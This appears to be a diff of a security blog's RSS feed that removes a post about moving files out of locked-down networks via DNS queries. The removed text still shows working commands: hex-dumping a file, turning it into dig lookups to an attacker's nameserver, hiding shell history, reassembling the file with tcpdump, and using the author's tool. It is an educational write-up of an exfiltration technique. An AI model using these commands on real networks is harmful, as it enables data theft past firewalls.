@@ -2,11 +2,14 @@
 <rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
   <channel>
     <title>File Transfer on #!/slash/note</title>
-    <link>https://leonjza.github.io/categories/file-transfer/index.xml</link>
+    <link>https://leonjza.github.io/categories/file-transfer/</link>
     <description>Recent content in File Transfer on #!/slash/note</description>
     <generator>Hugo -- gohugo.io</generator>
     <language>en-us</language>
-    <atom:link href="https://leonjza.github.io/categories/file-transfer/index.xml" rel="self" type="application/rss+xml" />
+    <lastBuildDate>Tue, 11 Mar 2014 00:00:00 +0000</lastBuildDate>
+    
+	<atom:link href="https://leonjza.github.io/categories/file-transfer/index.xml" rel="self" type="application/rss+xml" />
+    
     
     <item>
       <title>dnsfilexfer - yet another take on file transfer via DNS</title>
@@ -20,208 +23,7 @@
 
 &lt;p&gt;&amp;hellip; about anything particularly new. It is simply my ramblings, and some python code slapped together in literally a day in order for me to learn and get my hands dirty with the concepts.&lt;/p&gt;
 
-&lt;p&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;the-idea&#34;&gt;the idea&lt;/h2&gt;
-
-&lt;p&gt;At its very core, the idea of DNS file transfers and DNS tunnelling resides in the fact that a few cleverly crafted DNS queries could be merged &amp;amp; formatted together to form part of a larger chunk of data. While DNS itself is not actually meant for file transfers, this method is obviously a very hacky approach.&lt;/p&gt;
-
-&lt;p&gt;Consider the following scenario.&lt;/p&gt;
-
-&lt;p&gt;You have access to a very &lt;em&gt;secure&lt;/em&gt; network. &lt;em&gt;Secure&lt;/em&gt; in the sense that the firewalls are configured to allow &lt;strong&gt;NO&lt;/strong&gt; outbound tcp connectivity. In fact, UDP is also limited to only allow DNS queries as a primary DNS server lives outside of this &lt;em&gt;secure&lt;/em&gt; network, and provides most of the networks for this company with DNS services. Lets not dabble in the fact that the network can not receive any software updates etc, and just focus on the fact that it is a highly restricted network and contains potentially sensitive data.&lt;/p&gt;
-
-&lt;p&gt;You on the other hand, are responsible to come into the data centre where this network resides physically, and have some configuration changes to make, which involves you logging onto the console of a said server. While logged in, you notice a file, &lt;code&gt;z300_technical_diagrams.zip&lt;/code&gt;. Looks pretty juicy! But, the file is close to 20MB, and the flash disk you have with you will be handed back to its owner before you leave the premises. You are also very aware of the security posture of this network and know that the only connectivity that is allowed outbound is udp/53.&lt;/p&gt;
-
-&lt;p&gt;Luckily for you, you have a DNS file transfer server setup at home. You choose to use that as you would like to be sure that incase there may be some form of IPS on the border, your traffic wont be filtered. Your traffic will look like legit, semi &amp;lsquo;non-suspect&amp;rsquo; DNS lookup requests.&lt;/p&gt;
-
-&lt;h2 id=&#34;the-setup&#34;&gt;the setup&lt;/h2&gt;
-
-&lt;p&gt;So, to get the file &lt;code&gt;z300_technical_diagrams.zip&lt;/code&gt; out of this network, we need to create DNS lookups of parts of this file, specifying the name server to use. We test that lookups work with a quick dig to our name server at home. (server ip swapped to 127.0.0.1)&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% dig A 123456.fake.com @127.0.0.1
-
-; &amp;lt;&amp;lt;&amp;gt;&amp;gt; DiG 9.8.3-P1 &amp;lt;&amp;lt;&amp;gt;&amp;gt; 123456.fake.com @127.0.0.1
-;; global options: +cmd
-;; Got answer:
-;; -&amp;gt;&amp;gt;HEADER&amp;lt;&amp;lt;- opcode: QUERY, status: NOERROR, id: 24059
-;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 0
-
-;; QUESTION SECTION:
-;123456.fake.com.    IN A
-
-;; ANSWER SECTION:
-123456.fake.com.  60 IN A  127.0.0.1
-
-;; Query time: 0 msec
-;; SERVER: 127.0.0.1#53(127.0.0.1)
-;; WHEN: Tue Mar 11 07:55:31 2014
-;; MSG SIZE  rcvd: 49
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Great, so it seems like we have working comms to our own name server, as we got a answer of 127.0.0.1. Our server will always respond with 127.0.0.1 being the IP.&lt;/p&gt;
-
-&lt;h2 id=&#34;preparing-the-file&#34;&gt;preparing the file&lt;/h2&gt;
-
-&lt;p&gt;With comms working to our name server, we can get some information about the file and test if a hex dump tool like &lt;code&gt;xxd&lt;/code&gt; is available. This will enable us to break the file up in to little parts that can be used as DNS questions.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% ls -lah z300_technical_diagrams.zip
--rw-r--r--  1 bob  staff   20.1M Jan 27 01:01 z300_technical_diagrams.zip
-% xxd -p z300_technical_diagrams.zip
-504b03040a000000000042a9384400000000000000000000000017001c00
-7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
-e3523947e35275780b000104f50100000414000000504b03040a00000000
-0049a938440000000000000000000000001b001c007068616e746f6d6a73
-[snip]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Great. It looks like we have everything we need to make this work. :)&lt;/p&gt;
-
-&lt;h2 id=&#34;transferring-the-file&#34;&gt;&amp;lsquo;transferring&amp;rsquo; the file&lt;/h2&gt;
-
-&lt;p&gt;Now, we will use a simple awk, and prepare a few dig queries to our name server and finally, run the actual lookups. The best way to explain what is happening here is to actually show it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% xxd -p z300_technical_diagrams.zip | awk &#39;{ print &amp;quot;dig &amp;quot; $1 &amp;quot;.fake.io @127.0.0.1 +short&amp;quot; }&#39;
-dig 2e965f1608019c826a5b89b9a881b6df63a634a3ca83c01aa349411e4fa0.fake.io @127.0.0.1 +short
-dig 37aec06d77acd4d16ca559e008078e8bbfa2e1f0e3db8b995885fe398d48.fake.io @127.0.0.1 +short
-dig 763b55cfda9b977328588068d3a9b63b06811f5ecfae570e3f6e2d8b5e34.fake.io @127.0.0.1 +short
-dig 97b223da3800b1341ced3cc9e8542f53c0e123965e24591a9b75f58d4330.fake.io @127.0.0.1 +short
-dig eb9287c294832c7a79a84dc1cd066baf7e51adabc070eab8477a7cc4530d.fake.io @127.0.0.1 +short
-dig 9110217bcafcbaa48eee91567bfd698a76c70961ca9fea3402f929d4ee87.fake.io @127.0.0.1 +short
-dig f543e9a8c27602aeb2f6744a5097a7f20404f3e53d513c11d63e70434a71.fake.io @127.0.0.1 +short
-dig 61e85f16195f2fa75a82368cfbc781ace543ab22fcb72c97fbdb03015f8c.fake.io @127.0.0.1 +short
-[snip]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;As you can see, the output has generated a whole bunch of potential lookups for random strings. The same command above is rerun, but with &lt;code&gt;| sh&lt;/code&gt; at the end, performing the actual lookups.
-On our server, we have tcpdump listening on port 53, writing all of the recorded packets to a file.&lt;/p&gt;
-
-&lt;h2 id=&#34;back-home&#34;&gt;back home&lt;/h2&gt;
-
-&lt;p&gt;We close our bash session with &lt;code&gt;kill -9 $$&lt;/code&gt; to prevent any history from writing and relogin, completing the original work we came for.&lt;/p&gt;
-
-&lt;p&gt;Back home, it was time to stop the &lt;code&gt;tcpdump&lt;/code&gt; that was running, and attempt to reassemble that file. The domain we used for the lookups was &lt;code&gt;fake.io&lt;/code&gt;, so we just grep the output for that to ensure that we got the relevant parts (real ip&amp;rsquo;s masked to 127.0.0.1):&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% tcpdump -r raw -n | grep fake.io
-reading from file raw, link-type NULL (BSD loopback)
-19:31:32.919144 IP 127.0.0.1.49331 &amp;gt; 127.0.0.1.53: 39001+ A? 504b03040a000000000042a9384400000000000000000000000017001c00.fake.io. (86)
-19:31:32.925135 IP 127.0.0.1.51116 &amp;gt; 127.0.0.1.53: 23736+ A? 7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47.fake.io. (86)
-[snip]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Excellent! As we can see, we got some recorded requests, similar to those that we originally sent earlier in the day. Lets filter the output a little more, so that we sit with only the original hashes as output.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% tcpdump -r raw -n | grep fake.io | cut -d&#39; &#39; -f 8 | cut -d. -f 1
-reading from file raw, link-type NULL (BSD loopback)
-504b03040a000000000042a9384400000000000000000000000017001c00
-7068616e746f6d6a732d312e392e372d6d61636f73782f55540900032b47
-[snip]
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;Lastly, we can pipe all of this through &lt;code&gt;xxd -r&lt;/code&gt; and redirect the output to a new file. If all went well, this file &lt;em&gt;should&lt;/em&gt; be &lt;code&gt;z300_technical_diagrams.zip&lt;/code&gt;&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% tcpdump -r raw -n | grep fake.io | cut -d&#39; &#39; -f 8 | cut -d. -f 1 | xxd -r &amp;gt; z300_technical_diagrams.zip
-
-% file z300_technical_diagrams.zip
-z300_technical_diagrams.zip: Zip archive data, at least v1.0 to extract
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;h2 id=&#34;python-all-the-things&#34;&gt;python all the things&lt;/h2&gt;
-
-&lt;p&gt;Using only some bash commands, we have managed to transfer a file over the network using only DNS. This method however assumes that you have a running name server on the remote end that would actually respond to your requests, otherwise your lookups may take a very long time for the &lt;code&gt;dig&lt;/code&gt; command to timeout, and it would retry like 3 times which would mean you would need to &lt;code&gt;uniq&lt;/code&gt; your results before you &lt;code&gt;xxd -r&lt;/code&gt; them.&lt;/p&gt;
-
-&lt;p&gt;So, in order for me to &lt;em&gt;learn something new&lt;/em&gt;, I figured I&amp;rsquo;d write some python to help with this file transferring over DNS. Heck, maybe it could even result in something actually useful :o&lt;/p&gt;
-
-&lt;p&gt;The idea is simple. Create a fake DNS server that would listen and parse DNS packets. Allow for simple switches to write the received files to disk, and add a optional layer of encryption to the requests.&lt;/p&gt;
-
-&lt;h1 id=&#34;dnsfilexfer&#34;&gt;dnsfilexfer&lt;/h1&gt;
-
-&lt;p&gt;So, I took a day (literally), and a few more hours afterwards for bug fixes and wrote something that does this. Consisting of two pretty self explanatory parts; &lt;code&gt;dns_send.py&lt;/code&gt; &amp;amp; &lt;code&gt;dns_recv.py&lt;/code&gt;, one is able to &amp;lsquo;send files&amp;rsquo; using DNS lookups and store them on the remote end. You also have the option of only using the send part with the &lt;code&gt;-X&lt;/code&gt; flag, and have the output ready to use with &lt;code&gt;xxd -r&lt;/code&gt; later on your server.&lt;/p&gt;
-
-&lt;p&gt;The code can be &lt;a href=&#34;https://github.com/leonjza/dnsfilexfer&#34;&gt;found here&lt;/a&gt;&lt;/p&gt;
-
-&lt;h2 id=&#34;sample-usage&#34;&gt;sample usage&lt;/h2&gt;
-
-&lt;p&gt;Below a full example of the usage, both on the client &amp;amp; server:&lt;/p&gt;
-
-&lt;p&gt;We start the &amp;lsquo;server&amp;rsquo; component along with a secret that will be used to decrypt received messages. For now, we have omitted &lt;code&gt;-F&lt;/code&gt; as we are not going to write the message to a file, yet.&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% sudo python dns_recv.py --listen 0.0.0.0 --secret
-What is the secret?
-[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
-%
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;With our &amp;lsquo;server&amp;rsquo; started, we go to a client, and prepare the sending of a message by creating a sample message, and using the send script to sent it:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% echo &amp;quot;This is a test message that will be sent over DNS\n Cool eh?&amp;quot; &amp;gt; /tmp/message
-% cat /tmp/message
-This is a test message that will be sent over DNS
-Cool eh?
-
-% python dns_send.py --server 127.0.0.1 --file /tmp/message --indentifier dns_message_test --secret
-What is the secret?
-[INFO] Message is encypted with the secret
----START OF MESSAGE---
-/lHsvTZT3nJfQgdtUWSpKDqrpKuK+eLrU3bpAp9aNDJt6K/mwEc8sBUaJybPh7r5h2AOkJVezwBBODSV9hFM8w==
----END OF MESSAGE---
-[INFO] Sending lookup for : 00006:10000000000000000000000000000000000000000000000000.fake.io
-[INFO] Sending lookup for : 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io
-[INFO] Sending lookup for : 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io
-[INFO] Sending lookup for : 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io
-[INFO] Sending lookup for : 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io
-[INFO] Sending lookup for : 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io
-[INFO] Sending lookup for : 000638773d3d.fake.io
-[INFO] Sending lookup for : 00000000000000000000000000000000000000000000000000000000.fake.io
-[INFO] Message sent in 8 requests
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;We can see that the message was &amp;lsquo;sent&amp;rsquo; using 8 requests and the &lt;code&gt;--START OF MESSAGE--&lt;/code&gt; preview contains the encrypted version of our message.
-Looking at the server, we see that the message is received:&lt;/p&gt;
-
-&lt;pre&gt;&lt;code&gt;% sudo python dns_recv.py --listen 0.0.0.0 --secret
-Password:
-What is the secret?
-[INFO] Fake DNS server listening on 0.0.0.0 / 53 with a configured secret.
-[INFO] Full resource record query was for: 00006:10000000000000000000000000000000000000000000000000.fake.io.
-[INFO] Processing frame 00006:10000000000000000000000000000000000000000000000000
-[INFO] Full resource record query was for: 0001646e735f6d6573736167655f7465737400000000000000000000.fake.io.
-[INFO] Processing frame 0001646e735f6d6573736167655f7465737400000000000000000000
-[INFO] Full resource record query was for: 00028bf2046ae2144be75d2ce780b3f992e2c368021e.fake.io.
-[INFO] Processing frame 00028bf2046ae2144be75d2ce780b3f992e2c368021e
-[INFO] Full resource record query was for: 00032f6c487376545a54336e4a6651676474555753704b447172704b754b.fake.io.
-[INFO] Processing frame 00032f6c487376545a54336e4a6651676474555753704b447172704b754b
-[INFO] Full resource record query was for: 00042b654c7255336270417039614e444a74364b2f6d7745633873425561.fake.io.
-[INFO] Processing frame 00042b654c7255336270417039614e444a74364b2f6d7745633873425561
-[INFO] Full resource record query was for: 00054a796250683772356832414f6b4a56657a7742424f4453563968464d.fake.io.
-[INFO] Processing frame 00054a796250683772356832414f6b4a56657a7742424f4453563968464d
-[INFO] Full resource record query was for: 000638773d3d.fake.io.
-[INFO] Processing frame 000638773d3d
-[INFO] Full resource record query was for: 00000000000000000000000000000000000000000000000000000000.fake.io.
-[INFO] Processing frame 00000000000000000000000000000000000000000000000000000000
-[OK] Message seems to be intact and passes sha1 checksum of 8bf2046ae2144be75d2ce780b3f992e2c368021e
-[OK] Message was received in 8 requests
-[INFO] Message has been decrypted with the configured secret
-Message identifier: dns_message_test
-
----START OF MESSAGE---
-This is a test message that will be sent over DNS
-Cool eh?
-
----END OF MESSAGE---
-&lt;/code&gt;&lt;/pre&gt;
-
-&lt;p&gt;The scripts have some basic checksumming checks to ensure that the message that is received on the other end is intact. Of course, this is not limited to ASCII transfers only. Any file format inc. binary formats &lt;em&gt;should&lt;/em&gt; work just fine. &lt;strong&gt;HOWEVER&lt;/strong&gt; Be cautious of that fact that the file size determines the amount of requests required to send the message across the wire.&lt;/p&gt;
-
-&lt;p&gt;Using encryption by specifying a secret is entirely optional, as well as specifying a output file for the receiver script.&lt;/p&gt;
-
-&lt;h2 id=&#34;some-afterthoughts&#34;&gt;Some afterthoughts&lt;/h2&gt;
-
-&lt;p&gt;So this technique obviously has many challenges, such as the classic stateless nature of UDP that may cause out-of-sequence/lost frames (I am actually thinking of building some re-transmission logic into the scripts for lulz), the fact that the outgoing DNS port may be destination natted etc. In the case of a destination nat for udp/53, once could potentially query a zone whos name server you have control over, and capture the requests using a tcpdump there. One would then specify a specific fake domain to use with &lt;code&gt;--domain&lt;/code&gt; on the sending script, and have something like &lt;code&gt;fake.&amp;lt;your valid zone&amp;gt;.com&lt;/code&gt;, which will result in you still being able to grep for &lt;code&gt;fake&lt;/code&gt; in the tcpdump replay.&lt;/p&gt;
-
-&lt;h3 id=&#34;further-reading&#34;&gt;further reading&lt;/h3&gt;
-
-&lt;p&gt;&lt;a href=&#34;https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306&#34;&gt;https://isc.sans.edu/forums/diary/Packet+Tricks+with+xxd/10306&lt;/a&gt;
-&lt;a href=&#34;http://www.aldeid.com/wiki/File-transfer-via-DNS&#34;&gt;http://www.aldeid.com/wiki/File-transfer-via-DNS&lt;/a&gt;&lt;/p&gt;</description>
+&lt;p&gt;&lt;/p&gt;</description>
     </item>
     
   </channel>
